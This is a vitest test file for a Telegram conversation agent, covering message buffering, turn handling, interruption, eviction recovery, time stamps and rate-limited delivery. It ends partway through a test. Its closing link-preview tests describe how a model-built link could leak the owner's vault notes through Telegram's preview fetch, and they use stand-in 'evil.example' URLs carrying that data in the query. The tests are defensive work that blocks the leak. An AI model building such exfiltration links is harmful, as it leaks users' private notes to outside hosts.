import { evictDurableObject, runDurableObjectAlarm, runInDurableObject } from "cloudflare:test";
import { env } from "cloudflare:workers";
import type { AgentSettings } from "@kelpie/config";
import { stampOf } from "@kelpie/conversation";
import type { Usage } from "@kelpie/llm";
import { afterEach, describe, expect, it, vi } from "vitest";
import { AgentHost } from "../src/agent-host/agent-host.ts";
import { type ConversationAgent, MEMORY_NOTE } from "../src/conversation-agent.ts";
import { replacePortsForTesting } from "../src/ports.ts";
import {
  FAKE_USAGE,
  type FakeWorld,
  fail,
  fakeWorld,
  hang,
  held,
  INJECTED_FAILURE,
  OVER_BUDGET,
  refuse,
  reply,
  truncate,
} from "./fakes.ts";

// The fake clock starts a minute ahead, so a flush schedule never comes due on its own: tests call
// flush() the way the schedule would, except the one that checks the schedule itself.
const agent = (name: string) => env.CONVERSATION_AGENT.getByName(name);
const destination = { channel: "telegram", threadId: "chat-1" } as const;
const owner = { userId: "u-owner", role: "owner", via: "test" } as const;

/** 02:30 UTC on Sunday 4 October 2026, still Saturday evening in São Paulo. */
const SENT_AT = Date.UTC(2026, 9, 4, 2, 30);
/** What a message sent at SENT_AT by a user with no time zone is stamped with. */
const STAMP = "[Sun 4 Oct 2026, 02:30, UTC]";

/** Tests that change settings use an agent of their own, named after the conversation. */
function message(
  id: string,
  text: string,
  {
    userId = "u-owner",
    agentId = "assistant",
    sentAt = SENT_AT,
    timeZone = null as string | null,
  } = {},
) {
  return {
    agentId,
    providerMessageId: id,
    userId,
    role: "owner" as const,
    chatType: "direct" as const,
    text,
    destination,
    sentAt,
    timeZone,
  };
}

async function configure(agentId: string, changes: Partial<AgentSettings>) {
  expect(await env.AGENT_HOST.getByName(agentId).configure(changes, owner)).toMatchObject({
    ok: true,
  });
}

/** A user message as history holds it: stamped, since tests send at SENT_AT with no zone. */
const user = (text: string) => ({
  role: "user",
  parts: [{ type: "text", text: `${STAMP} ${text}` }],
});
const neutral = (text: string) => ({ role: "assistant", parts: [{ type: "text", text }] });

function use(world: FakeWorld): FakeWorld {
  replacePortsForTesting(world.ports);
  return world;
}

async function statuses(stub: ReturnType<typeof agent>) {
  return (await stub.outbox()).map((row) => row.status);
}

afterEach(() => {
  replacePortsForTesting(undefined);
  vi.restoreAllMocks();
});

describe("ConversationAgent buffering", () => {
  it("buffers messages and re-arms one flush on every new message", async () => {
    const world = use(fakeWorld([]));
    const stub = agent("rearm");
    const start = world.clock;

    // The wait is the same whatever a message says (ADR-0024), and starts again with each one.
    expect(await stub.ingest(message("m1", "so I was thinking..."))).toEqual({
      status: "accepted",
      flushAt: start + 10_000,
    });
    world.clock = start + 1_000;
    expect(await stub.ingest(message("m2", "can you check my order?"))).toEqual({
      status: "accepted",
      flushAt: start + 11_000,
    });
    const schedules = await runInDurableObject(stub, (instance: ConversationAgent) =>
      instance.getSchedules(),
    );
    expect(schedules).toHaveLength(1);
  });

  it("answers at once when the owner removes the wait", async () => {
    const world = use(fakeWorld([reply("Right away.")]));
    const stub = agent("no-wait");
    await configure("no-wait", { quietMs: 0 });

    expect(await stub.ingest(message("m1", "so", { agentId: "no-wait" }))).toEqual({
      status: "accepted",
      flushAt: null,
    });
    await vi.waitFor(() => expect(world.sent).toEqual(["Right away."]));
  });

  it("arms one schedule when messages arrive while the settings are read", async () => {
    use(fakeWorld([]));
    const stub = agent("concurrent");

    await Promise.all([
      stub.ingest(message("m1", "so")),
      stub.ingest(message("m2", "it was the blue one")),
    ]);

    const schedules = await runInDurableObject(stub, (instance: ConversationAgent) =>
      instance.getSchedules(),
    );
    expect(schedules).toHaveLength(1);
  });

  it("ignores a flush from a schedule that a newer message replaced", async () => {
    use(fakeWorld([reply("Hi!")]));
    const stub = agent("stale-schedule");
    await stub.ingest(message("m1", "where is my order?"));

    await stub.flush({ epoch: 0 });
    expect(await stub.turns()).toEqual([]);
  });

  it("ignores a duplicate delivery", async () => {
    const world = use(fakeWorld([reply("Hi!")]));
    const stub = agent("dedupe");
    const start = world.clock;
    await stub.ingest(message("m1", "where is my order?"));

    expect(await stub.ingest(message("m1", "where is my order?"))).toEqual({
      status: "duplicate",
      flushAt: start + 10_000,
    });
    await stub.flush();
    await vi.waitFor(() => expect(world.sent).toEqual(["Hi!"]));
    expect(world.requests[0]?.messages).toEqual([user("where is my order?")]);
  });

  it("merges messages in arrival order, even within the same millisecond", async () => {
    const world = use(fakeWorld([reply("Ok.")]));
    const stub = agent("order");
    await stub.ingest(message("zz", "first"));
    await stub.ingest(message("aa", "second"));
    await stub.flush();

    await vi.waitFor(() => expect(world.requests).toHaveLength(1));
    expect(world.requests[0]?.messages).toEqual([user("first\nsecond")]);
  });

  it("keeps each author's messages apart", async () => {
    const world = use(fakeWorld([reply("Ok.")]));
    const stub = agent("authors");
    await stub.ingest(message("m1", "from one", { userId: "u-one" }));
    await stub.ingest(message("m2", "from another", { userId: "u-two" }));
    await stub.flush();

    await vi.waitFor(() => expect(world.requests).toHaveLength(1));
    expect(world.requests[0]?.messages).toEqual([user("from one"), user("from another")]);
  });

  it("refuses a message for another destination, another agent, or one that is too long", async () => {
    use(fakeWorld([]));
    const stub = agent("refusals");
    await stub.ingest(message("m1", "hi?"));

    expect(
      await stub.ingest({
        ...message("m2", "hi?"),
        destination: { ...destination, threadId: "x" },
      }),
    ).toEqual({ status: "rejected", reason: "destination_mismatch" });
    expect(await stub.ingest(message("m3", "hi?", { agentId: "someone-else" }))).toEqual({
      status: "rejected",
      reason: "agent_mismatch",
    });
    expect(await stub.ingest(message("m4", "x".repeat(16_001)))).toEqual({
      status: "rejected",
      reason: "too_long",
    });
  });

  it("flushes through the alarm when the schedule comes due", async () => {
    const world = use(fakeWorld([reply("On time.")]));
    world.clock = Date.now();
    const stub = agent("alarm");
    await configure("alarm", { quietMs: 50 });
    await stub.ingest(message("m1", "ping?", { agentId: "alarm" }));

    await new Promise((resolve) => setTimeout(resolve, 1_100));
    world.clock = Date.now();
    await runDurableObjectAlarm(stub);
    await vi.waitFor(() => expect(world.sent).toEqual(["On time."]));
  });

  it("answers a message that arrives while a flush reads the settings", async () => {
    const world = use(fakeWorld([reply("Both."), reply("The rest.")]));
    const stub = agent("flush-race");
    await stub.ingest(message("m1", "first part"));

    await Promise.all([stub.flush(), stub.ingest(message("m2", "second part"))]);
    const schedules = await runInDurableObject(stub, (instance: ConversationAgent) =>
      instance.getSchedules(),
    );
    expect(schedules.length).toBeLessThanOrEqual(1);
    await stub.flush();

    // Whichever way the two calls interleaved, history holds each message once, and the last turn,
    // which saw both, was delivered.
    await vi.waitFor(async () => expect((await stub.turns()).at(-1)?.status).toBe("delivered"));
    const history = JSON.stringify(await stub.history());
    expect(history.match(/first part/g)).toHaveLength(1);
    expect(history.match(/second part/g)).toHaveLength(1);
    const lastRequest = JSON.stringify(world.requests.at(-1)?.messages);
    expect(lastRequest).toContain("first part");
    expect(lastRequest).toContain("second part");
  });

  it("starts one turn when two flushes race, and doesn't interrupt it", async () => {
    const world = use(fakeWorld([reply("Once."), reply("Twice.")]));
    world.blockSends.add(0);
    const stub = agent("double-flush");
    await stub.ingest(message("m1", "anyone there?"));
    // The second flush gets the settings only after the first one started its turn.
    const turnConfig = AgentHost.prototype.turnConfig;
    let calls = 0;
    vi.spyOn(AgentHost.prototype, "turnConfig").mockImplementation(async function (
      this: AgentHost,
    ) {
      calls += 1;
      if (calls === 2) await new Promise((resolve) => setTimeout(resolve, 50));
      return turnConfig.call(this);
    });

    await Promise.all([stub.flush(), stub.flush()]);
    expect(await stub.turns()).toMatchObject([{ status: "running" }]);

    world.blockSends.delete(0);
    await vi.waitFor(async () =>
      expect(await stub.turns()).toMatchObject([{ status: "delivered" }]),
    );
    expect(world.sent).toEqual(["Once."]);
  });

  it("asks the vault for the system prompt when a turn starts, not for every message", async () => {
    const world = use(fakeWorld([reply("Hi.")]));
    const stub = agent("vault-calls");
    const turnConfig = vi.spyOn(AgentHost.prototype, "turnConfig");
    await stub.ingest(message("m1", "oi"));
    await stub.ingest(message("m2", "tudo bem?"));
    expect(turnConfig).not.toHaveBeenCalled();
    await stub.flush();
    expect(turnConfig).toHaveBeenCalledTimes(1);
    await vi.waitFor(() => expect(world.sent).toEqual(["Hi."]));
  });

  it("plans the flush again when the provider retries a message whose planning failed", async () => {
    const world = use(fakeWorld([reply("Got it.")]));
    const stub = agent("plan-fails");
    vi.spyOn(AgentHost.prototype, "config").mockImplementationOnce(() => {
      throw new Error(INJECTED_FAILURE);
    });

    await expect(stub.ingest(message("m1", "are you there?"))).rejects.toThrow();
    // The provider retries the same message: without planning again, nothing would answer it.
    const retried = await stub.ingest(message("m1", "are you there?"));
    expect(retried).toMatchObject({ status: "duplicate", flushAt: expect.any(Number) });

    await stub.flush();
    await vi.waitFor(() => expect(world.sent).toEqual(["Got it."]));
  });
});

describe("ConversationAgent turns", () => {
  it("answers with paced bubbles and records the reply", async () => {
    const world = use(fakeWorld([reply("One.\n\nTwo.")]));
    const stub = agent("turn");
    await stub.ingest(message("m1", "so I was thinking..."));
    await stub.ingest(message("m2", "what do you suggest?"));
    await stub.flush();

    await vi.waitFor(() => expect(world.sent).toEqual(["One.", "Two."]));
    // Telegram shows "typing" before each bubble.
    expect(world.typing).toBe(2);
    expect(world.requests[0]).toMatchObject({
      system: expect.any(String),
      messages: [user("so I was thinking...\nwhat do you suggest?")],
    });
    await vi.waitFor(async () =>
      expect(await stub.history()).toEqual([
        user("so I was thinking...\nwhat do you suggest?"),
        { ...neutral("One.\n\nTwo."), native: expect.objectContaining({ provider: "anthropic" }) },
      ]),
    );
    expect(await statuses(stub)).toEqual(["sent", "sent"]);
  });

  it("answers each message at once, in one message, when conversational mode is off", async () => {
    const world = use(fakeWorld([reply("One.\n\nTwo.")]));
    const stub = agent("plain");
    await configure("plain", { conversational: false });

    expect(await stub.ingest(message("m1", "so I was thinking...", { agentId: "plain" }))).toEqual({
      status: "accepted",
      flushAt: null,
    });
    await vi.waitFor(() => expect(world.sent).toEqual(["One.\n\nTwo."]));
    expect(world.typing).toBe(0);
  });

  it("records each turn's token usage, and logs its totals without any text", async () => {
    const logged: unknown[][] = [];
    vi.spyOn(console, "log").mockImplementation((...args) => {
      logged.push(args);
    });
    use(fakeWorld([reply("a reply that stays private"), refuse()]));
    const stub = agent("usage");
    await stub.ingest(message("m1", "a question that stays private"));
    await stub.flush();
    await vi.waitFor(async () => expect((await stub.turns()).at(-1)?.status).toBe("delivered"));
    await stub.ingest(message("m2", "something it won't do"));
    await stub.flush();
    await vi.waitFor(async () => expect((await stub.turns()).at(-1)?.status).toBe("refused"));

    // A refusal still cost tokens, so it is recorded too.
    expect((await stub.turns()).map((turn) => turn.usage)).toEqual([FAKE_USAGE, FAKE_USAGE]);
    const usageLines = logged.filter((line) => String(line[0]).includes("turn usage"));
    expect(usageLines).toHaveLength(2);
    expect(usageLines[0]?.[1]).toEqual({ attempts: 1, input: 2_000, cacheRead: 800, output: 40 });
    expect(JSON.stringify(logged)).not.toContain("private");
  });

  it("sends nothing when the model refuses", async () => {
    const world = use(fakeWorld([refuse()]));
    const stub = agent("refusal");
    await stub.ingest(message("m1", "something it won't do"));
    await stub.flush();

    await vi.waitFor(async () => expect(await stub.turns()).toMatchObject([{ status: "refused" }]));
    expect(world.sent).toEqual([]);
    expect(await stub.history()).toEqual([user("something it won't do")]);
  });

  it.each([
    ["the model call fails", "model-fails", fail()],
    ["the stream ends without a reply", "model-truncates", truncate()],
  ])("fails the turn when %s, and answers the next message", async (_label, name, script) => {
    const world = use(fakeWorld([script, reply("Back.")]));
    const stub = agent(name);
    await stub.ingest(message("m1", "first?"));
    await stub.flush();
    await vi.waitFor(async () => expect(await stub.turns()).toMatchObject([{ status: "failed" }]));
    expect(world.sent).toEqual([]);

    await stub.ingest(message("m2", "second?"));
    await stub.flush();
    await vi.waitFor(() => expect(world.sent).toEqual(["Back."]));
    expect(world.requests[1]?.messages).toEqual([user("first?"), user("second?")]);
  });

  it("fails the turn when a send fails, keeping what was already sent", async () => {
    const world = use(fakeWorld([reply("One.\n\nTwo.\n\nThree.")]));
    world.failSends.add(1);
    const stub = agent("send-fails");
    await stub.ingest(message("m1", "three things?"));
    await stub.flush();

    await vi.waitFor(async () => expect(await stub.turns()).toMatchObject([{ status: "failed" }]));
    expect(world.sent).toEqual(["One."]);
    expect(await statuses(stub)).toEqual(["sent", "cancelled", "cancelled"]);
    expect(await stub.history()).toEqual([user("three things?"), neutral("One.")]);
  });

  it("keeps delivering when 'typing' fails", async () => {
    const world = use(fakeWorld([reply("One.\n\nTwo.")]));
    world.failTyping = true;
    const stub = agent("typing-fails");
    await stub.ingest(message("m1", "two things?"));
    await stub.flush();

    await vi.waitFor(() => expect(world.sent).toEqual(["One.", "Two."]));
  });

  it("replays earlier replies without native output after the system prompt changes", async () => {
    const world = use(fakeWorld([reply("First."), reply("Second.")]));
    const stub = agent("prompt-change");
    await stub.ingest(message("m1", "one?", { agentId: "prompt-change" }));
    await stub.flush();
    await vi.waitFor(() => expect(world.sent).toEqual(["First."]));

    await configure("prompt-change", { systemPrompt: "You are terse." });
    await stub.ingest(message("m2", "two?", { agentId: "prompt-change" }));
    await stub.flush();

    await vi.waitFor(() => expect(world.requests).toHaveLength(2));
    expect(world.requests[1]?.system).toBe(`You are terse.\n\n${MEMORY_NOTE}`);
    expect(world.requests[1]?.messages[1]).toEqual(neutral("First."));
  });

  it("records a reply under the prompt version it was produced with", async () => {
    const world = use(fakeWorld([reply("Done."), reply("Next.")]));
    world.blockSleeps.add(0);
    const stub = agent("prompt-mid-turn");
    await stub.ingest(message("m1", "anything?", { agentId: "prompt-mid-turn" }));
    await stub.flush();
    await vi.waitFor(() => expect(world.requests).toHaveLength(1));

    // The prompt changes while the first reply waits to be delivered; then it is delivered.
    await configure("prompt-mid-turn", { systemPrompt: "You are terse." });
    world.blockSleeps.clear();
    await stub.ingest(message("m2", "and now?", { agentId: "prompt-mid-turn" }));
    await stub.flush();

    await vi.waitFor(() => expect(world.requests).toHaveLength(2));
    expect(world.requests[0]?.system).not.toBe(`You are terse.\n\n${MEMORY_NOTE}`);
    expect(world.requests[1]?.system).toBe(`You are terse.\n\n${MEMORY_NOTE}`);
  });

  it("starts a turn with the agent's settings as they are at the flush", async () => {
    const world = use(fakeWorld([reply("Short.")]));
    const stub = agent("flush-settings");
    await stub.ingest(message("m1", "how long?", { agentId: "flush-settings" }));

    await configure("flush-settings", { systemPrompt: "Be brief.", maxOutputTokens: 64 });
    await stub.flush();

    await vi.waitFor(() => expect(world.requests).toHaveLength(1));
    expect(world.requests[0]).toMatchObject({
      system: `Be brief.\n\n${MEMORY_NOTE}`,
      maxOutputTokens: 64,
    });
  });
});

describe("ConversationAgent interruption", () => {
  it("cancels the model call when a new message arrives, and answers both together", async () => {
    const world = use(fakeWorld([hang(), reply("Got both.")]));
    const stub = agent("interrupt-model");
    await stub.ingest(message("m1", "first question?"));
    await stub.flush();
    await vi.waitFor(() => expect(world.requests).toHaveLength(1));

    await stub.ingest(message("m2", "and a second one?"));
    expect(world.cancelled).toBe(1);
    await stub.flush();

    await vi.waitFor(() => expect(world.sent).toEqual(["Got both."]));
    expect(world.requests[1]?.messages).toEqual([
      user("first question?"),
      user("and a second one?"),
    ]);
  });

  it("stops after the first bubble when interrupted, and keeps only what was sent", async () => {
    const world = use(fakeWorld([reply("One.\n\nTwo.\n\nThree."), reply("Okay.")]));
    world.blockSleeps.add(1);
    const stub = agent("interrupt-delivery");
    await stub.ingest(message("m1", "tell me three things?"));
    await stub.flush();
    await vi.waitFor(() => expect(world.sent).toEqual(["One."]));

    await stub.ingest(message("m2", "actually, stop"));
    expect(await statuses(stub)).toEqual(["sent", "cancelled", "cancelled"]);
    await stub.flush();

    await vi.waitFor(() => expect(world.sent).toEqual(["One.", "Okay."]));
    // The next turn sees exactly what the user saw, without the full reply's native output.
    expect(world.requests[1]?.messages).toEqual([
      user("tell me three things?"),
      neutral("One."),
      user("actually, stop"),
    ]);
  });

  it("counts a bubble caught mid-send as sent, and keeps history in order", async () => {
    const world = use(fakeWorld([reply("One.\n\nTwo.\n\nThree."), reply("Okay.")]));
    world.blockSends.add(1);
    const stub = agent("interrupt-send");
    await stub.ingest(message("m1", "three things?"));
    await stub.flush();
    await vi.waitFor(() => expect(world.sent).toEqual(["One."]));
    await vi.waitFor(async () =>
      expect(await statuses(stub)).toEqual(["sent", "sending", "pending"]),
    );

    await stub.ingest(message("m2", "wait"));
    await stub.flush();

    await vi.waitFor(() => expect(world.requests).toHaveLength(2));
    expect(world.requests[1]?.messages).toEqual([
      user("three things?"),
      neutral("One.\n\nTwo."),
      user("wait"),
    ]);
    // Let the old send finish: it must leave the settled turn untouched.
    world.blockSends.clear();
    await vi.waitFor(() => expect(world.sent).toContain("Two."));
    expect((await stub.turns()).map((turn) => turn.status)).toEqual(["interrupted", "delivered"]);
  });
});

describe("ConversationAgent recovery", () => {
  // A running fiber keeps a heartbeat alarm; when it fires on the new instance, recovery runs.

  it("resends only the pending bubbles after an eviction mid-delivery", async () => {
    const world = use(fakeWorld([reply("One.\n\nTwo.\n\nThree.")]));
    world.hangSends.add(1);
    const stub = agent("recover-delivery");
    await stub.ingest(message("m1", "three things?"));
    await stub.flush();
    await vi.waitFor(() => expect(world.sent).toEqual(["One."]));

    await evictDurableObject(stub);
    expect(await runDurableObjectAlarm(stub)).toBe(true);

    await vi.waitFor(() => expect(world.sent).toEqual(["One.", "Two.", "Three."]));
    await vi.waitFor(async () => expect(await statuses(stub)).toEqual(["sent", "sent", "sent"]));
  });

  it("calls the model again once when the eviction came before the reply", async () => {
    const world = use(fakeWorld([hang(), reply("Again.")]));
    const stub = agent("recover-call");
    await stub.ingest(message("m1", "anyone?"));
    await stub.flush();
    await vi.waitFor(() => expect(world.requests).toHaveLength(1));

    await evictDurableObject(stub);
    await runDurableObjectAlarm(stub);

    await vi.waitFor(() => expect(world.sent).toEqual(["Again."]));
    expect(await stub.turns()).toMatchObject([{ status: "delivered", attempts: 2 }]);
  });

  it("gives up after a second eviction before the reply", async () => {
    const world = use(fakeWorld([hang(), hang()]));
    const stub = agent("recover-give-up");
    await stub.ingest(message("m1", "anyone?"));
    await stub.flush();
    await vi.waitFor(() => expect(world.requests).toHaveLength(1));
    await evictDurableObject(stub);
    await runDurableObjectAlarm(stub);
    await vi.waitFor(() => expect(world.requests).toHaveLength(2));

    await evictDurableObject(stub);
    await runDurableObjectAlarm(stub);

    await vi.waitFor(async () => expect(await stub.turns()).toMatchObject([{ status: "failed" }]));
    expect(world.sent).toEqual([]);
  });
});

describe("ConversationAgent time stamps", () => {
  const textOf = (entry: unknown) =>
    (entry as { parts: { text: string }[] }).parts.map((part) => part.text).join("");

  it("stamps a message with its local send time, and never touches the system prompt", async () => {
    const world = use(fakeWorld([reply("Good evening."), reply("Still here.")]));
    const stub = agent("stamp-local");
    const zone = { timeZone: "America/Sao_Paulo" };
    await stub.ingest(message("m1", "still up?", zone));
    await stub.flush();
    await vi.waitFor(() => expect(world.sent).toEqual(["Good evening."]));

    await stub.ingest(message("m2", "and now?", { ...zone, sentAt: SENT_AT + 60_000 }));
    await stub.flush();
    await vi.waitFor(() => expect(world.requests).toHaveLength(2));

    expect(textOf(world.requests[1]?.messages[0])).toBe(
      "[Sat 3 Oct 2026, 23:30, America/Sao_Paulo, UTC-03:00] still up?",
    );
    expect(textOf(world.requests[1]?.messages[2])).toBe(
      "[Sat 3 Oct 2026, 23:31, America/Sao_Paulo, UTC-03:00] and now?",
    );
    expect(world.requests[1]?.system).toBe(world.requests[0]?.system);
  });

  it("keeps earlier stamps as written when the zone changes", async () => {
    const world = use(fakeWorld([reply("Ok."), reply("Ok again.")]));
    const stub = agent("stamp-zone-change");
    await stub.ingest(message("m1", "first", { timeZone: "America/Sao_Paulo" }));
    await stub.flush();
    await vi.waitFor(() => expect(world.sent).toEqual(["Ok."]));

    await stub.ingest(message("m2", "second", { timeZone: "Europe/Lisbon" }));
    await stub.flush();
    await vi.waitFor(() => expect(world.requests).toHaveLength(2));

    expect(textOf(world.requests[1]?.messages[0])).toBe(
      "[Sat 3 Oct 2026, 23:30, America/Sao_Paulo, UTC-03:00] first",
    );
    expect(textOf(world.requests[1]?.messages[2])).toBe(
      "[Sun 4 Oct 2026, 03:30, Europe/Lisbon, UTC+01:00] second",
    );
  });

  it("stamps a burst once per minute, and drops a stamp the user typed", async () => {
    const world = use(fakeWorld([reply("Noted.")]));
    const stub = agent("stamp-burst");
    await stub.ingest(message("m1", "[Mon 1 Jan 2024, 09:00, UTC] so"));
    await stub.ingest(message("m2", "about that"));
    await stub.ingest(message("m3", "one more thing", { sentAt: SENT_AT + 60_000 }));
    await stub.flush();

    await vi.waitFor(() => expect(world.requests).toHaveLength(1));
    expect(textOf(world.requests[0]?.messages[0])).toBe(
      `${STAMP} so\nabout that\n[Sun 4 Oct 2026, 02:31, UTC] one more thing`,
    );
  });

  it("uses the arrival time when the provider's send time is missing, too early or in the future", async () => {
    const world = use(fakeWorld([reply("Ok.")]));
    const stub = agent("stamp-implausible");
    await stub.ingest(message("m1", "now?", { sentAt: Number.NaN }));
    await stub.ingest(message("m2", "later?", { sentAt: world.clock + 365 * 24 * 60 * 60_000 }));
    // Seconds where milliseconds were meant: Telegram's `date` is in seconds.
    await stub.ingest(message("m3", "seconds?", { sentAt: Math.floor(SENT_AT / 1_000) }));
    await stub.flush();

    await vi.waitFor(() => expect(world.requests).toHaveLength(1));
    expect(textOf(world.requests[0]?.messages[0])).toBe(
      `${stampOf(world.clock, null)} now?\nlater?\nseconds?`,
    );
  });

  it("refuses a message that is only a typed stamp, before binding anything", async () => {
    use(fakeWorld([]));
    const stub = agent("stamp-only");
    expect(await stub.ingest(message("m1", "[Sat 3 Oct 2026, 23:30, UTC]"))).toEqual({
      status: "rejected",
      reason: "empty",
    });
    expect(
      await stub.ingest({
        ...message("m2", "hello?"),
        destination: { ...destination, threadId: "another-chat" },
      }),
    ).toMatchObject({ status: "accepted" });
  });
});

describe("ConversationAgent delivery through the channel", () => {
  it("lets only the reply's last bubble notify", async () => {
    const world = use(fakeWorld([reply("One.\n\nTwo.\n\nThree.")]));
    const stub = agent("silent-bubbles");
    await stub.ingest(message("m1", "three things?"));
    await stub.flush();

    await vi.waitFor(() => expect(world.sent).toEqual(["One.", "Two.", "Three."]));
    expect(world.sends.map((send) => send.silent)).toEqual([true, true, false]);
  });

  it("waits when the channel rate-limits a bubble, then sends it", async () => {
    const world = use(fakeWorld([reply("One.\n\nTwo.")]));
    world.rateLimitSends.add(0);
    const stub = agent("rate-limited");
    await stub.ingest(message("m1", "two things?"));
    await stub.flush();

    await vi.waitFor(async () =>
      expect(await stub.turns()).toMatchObject([{ status: "delivered" }]),
    );
    expect(world.sent).toEqual(["One.", "Two."]);
    // The wait the channel asked for comes right after the first bubble's pacing.
    expect(world.sleeps[1]).toBe(50);
    expect(world.sends.map((send) => send.silent)).toEqual([true, false]);
  });

  it("fails the turn when the channel keeps rate-limiting the same bubble", async () => {
    const world = use(fakeWorld([reply("One.")]));
    for (const call of [0, 1, 2]) world.rateLimitSends.add(call);
    const stub = agent("rate-limited-thrice");
    await stub.ingest(message("m1", "one thing?"));
    await stub.flush();

    await vi.waitFor(async () => expect(await stub.turns()).toMatchObject([{ status: "failed" }]));
    expect(world.sent).toEqual([]);
    expect(world.sendAttempts).toBe(3);
    expect(await statuses(stub)).toEqual(["cancelled"]);
  });

  it("fails the turn rather than stall when the channel asks for too long a wait", async () => {
    const world = use(fakeWorld([reply("One.")]));
    world.rateLimitSends.add(0);
    world.rateLimitWaitMs = 120_000;
    const stub = agent("rate-limited-long");
    await stub.ingest(message("m1", "one thing?"));
    await stub.flush();

    await vi.waitFor(async () => expect(await stub.turns()).toMatchObject([{ status: "failed" }]));
    expect(world.sendAttempts).toBe(1);
    expect(world.sleeps).not.toContain(120_000);
  });

  it("keeps typing up while the model answers, and stops it once the reply is in", async () => {
    const world = use(fakeWorld([reply("Done.")]));
    const stub = agent("typing-kept");
    await stub.ingest(message("m1", "anything?"));
    await stub.flush();

    await vi.waitFor(() => expect(world.sent).toEqual(["Done."]));
    expect(world.typingKept).toBe(1);
    expect(world.typingStopped).toBe(1);
  });

  it("stops typing when a new message interrupts the model", async () => {
    const world = use(fakeWorld([hang(), reply("Both.")]));
    const stub = agent("typing-interrupted");
    await stub.ingest(message("m1", "first?"));
    await stub.flush();
    await vi.waitFor(() => expect(world.typingKept).toBe(1));

    await stub.ingest(message("m2", "actually, wait"));
    await vi.waitFor(() => expect(world.typingStopped).toBe(1));
  });

  it("shows no typing when conversational mode is off", async () => {
    const world = use(fakeWorld([reply("Plain.")]));
    const stub = agent("typing-off");
    await configure("typing-off", { conversational: false });
    await stub.ingest(message("m1", "hello?", { agentId: "typing-off" }));

    await vi.waitFor(() => expect(world.sent).toEqual(["Plain."]));
    expect(world.typingKept).toBe(0);
  });
});

// Telegram's servers fetch a link to preview it, so a link the model built could carry the vault's
// notes out in its path or query (#130). Only a link from the turn's inputs may be previewed.
describe("ConversationAgent link previews", () => {
  const MENU = "https://food.example/menu";
  const NOTE_LINK = "https://notes.example/ana";
  const MEMORY = [
    `<memory-abc note="Notes from the owner's vault, for reference.">`,
    "## Ana (memory/people/ana.md) [abc]",
    `Mora em Lisboa. Perfil: ${NOTE_LINK}`,
    "</memory-abc>",
  ].join("\n");

  it("previews a link the person sent, and none the model built", async () => {
    const leak = "https://evil.example/?q=Mora%20em%20Lisboa";
    const world = use(fakeWorld([reply(`Here: ${MENU}\n\nAnd ${leak}\n\nNo link here.`)]));
    const stub = agent("preview-person");
    await stub.ingest(message("m1", `what about ${MENU}?`));
    await stub.flush();

    await vi.waitFor(() => expect(world.sends).toHaveLength(3));
    expect(world.sends).toEqual([
      { text: `Here: ${MENU}`, silent: true, previewUrl: MENU },
      { text: `And ${leak}`, silent: true },
      { text: "No link here.", silent: false },
    ]);
  });

  it("previews a link from the turn's memory block, even after an eviction mid-delivery", async () => {
    const world = use(fakeWorld([reply(`One.\n\nO perfil: ${NOTE_LINK}\n\nThree.`)]));
    world.memory = MEMORY;
    world.hangSends.add(1);
    const stub = agent("preview-memory");
    await stub.ingest(message("m1", "onde a Ana mora?"));
    await stub.flush();
    await vi.waitFor(() => expect(world.sent).toEqual(["One."]));

    // The resend reads the turn's block back from storage.
    await evictDurableObject(stub);
    expect(await runDurableObjectAlarm(stub)).toBe(true);

    await vi.waitFor(() => expect(world.sends).toHaveLength(3));
    expect(world.sends.map((send) => send.previewUrl)).toEqual([undefined, NOTE_LINK, undefined]);
  });

  it("previews no link from a session page in the memory block: the model may have written it", async () => {
    const SESSION_LINK = "https://evil.example/?q=Lisboa";
    const world = use(fakeWorld([reply(`${SESSION_LINK}\n\n${NOTE_LINK}`)]));
    world.memory = [
      `<memory-abc note="Notes from the owner's vault, for reference.">`,
      "## Ana (memory/people/ana.md) [abc]",
      `Perfil: ${NOTE_LINK}`,
      "",
      "## Session (conversations/telegram-chat-1/sessions/2026/2026-10-04-session-12.md) [abc]",
      `assistant: veja ${SESSION_LINK}`,
      "",
      // A path the vault's layout doesn't place, such as one cut short, counts as unknown.
      "## Cut (conversations/telegram-chat-1/sessions/2026/2026-10-04-sess…) [abc]",
      `assistant: ${SESSION_LINK}`,
      "</memory-abc>",
    ].join("\n");
    const stub = agent("preview-session-page");
    await stub.ingest(message("m1", "onde a Ana mora?"));
    await stub.flush();

    await vi.waitFor(() => expect(world.sends).toHaveLength(2));
    expect(world.sends.map((send) => send.previewUrl)).toEqual([undefined, NOTE_LINK]);
  });

  it("previews no link from a note Kelpie wrote itself: the model may have written it", async () => {
    const MODEL_LINK = "https://evil.example/?q=Lisboa";
    const world = use(fakeWorld([reply(`${MODEL_LINK}\n\n${NOTE_LINK}`)]));
    world.memory = [
      `<memory-abc note="Notes from the owner's vault, for reference.">`,
      "## Ana (memory/people/ana.md) [abc]",
      `Perfil: ${NOTE_LINK}`,
      "",
      "## Bruno (memory/people/bruno.md) [abc]",
      `Site: ${MODEL_LINK}`,
      "</memory-abc>",
    ].join("\n");
    world.memoryNotes = [
      { path: "memory/people/ana.md", byKelpie: false },
      { path: "memory/people/bruno.md", byKelpie: true },
    ];
    const stub = agent("preview-kelpie-note");
    await stub.ingest(message("m1", "onde a Ana e o Bruno moram?"));
    await stub.flush();

    await vi.waitFor(() => expect(world.sends).toHaveLength(2));
    expect(world.sends.map((send) => send.previewUrl)).toEqual([undefined, NOTE_LINK]);
  });

  it("previews no link the model changed, by a query or a fragment", async () => {
    const world = use(fakeWorld([reply(`${MENU}?ref=Lisboa\n\n${MENU}#Lisboa\n\n${MENU}/Lisboa`)]));
    const stub = agent("preview-changed");
    await stub.ingest(message("m1", `see ${MENU}`));
    await stub.flush();

    await vi.waitFor(() => expect(world.sends).toHaveLength(3));
    for (const send of world.sends) expect(send).not.toHaveProperty("previewUrl");
  });

  it("previews the bubble's first allowed link, past one the model built", async () => {
    const other = "https://drinks.example/list";
    const world = use(
      fakeWorld([reply(`Try https://evil.example/x, then ${other} (or ${MENU}).`)]),
    );
    const stub = agent("preview-first");
    await stub.ingest(message("m1", `${MENU} or ${other}, which one?`));
    await stub.flush();

    await vi.waitFor(() => expect(world.sends).toHaveLength(1));
    expect(world.sends[0]?.previewUrl).toBe(other);
  });

  it("keeps the preview of a link from an earlier message the request still sends", async () => {
    const world = use(fakeWorld([reply("Ok."), reply(`It's all on ${MENU}.`)]));
    const stub = agent("preview-earlier");
    await stub.ingest(message("m1", `bookmark ${MENU}`));
    await stub.flush();
    await vi.waitFor(() => expect(world.sent).toEqual(["Ok."]));
    await stub.ingest(message("m2", "and the prices?"));
    await stub.flush();

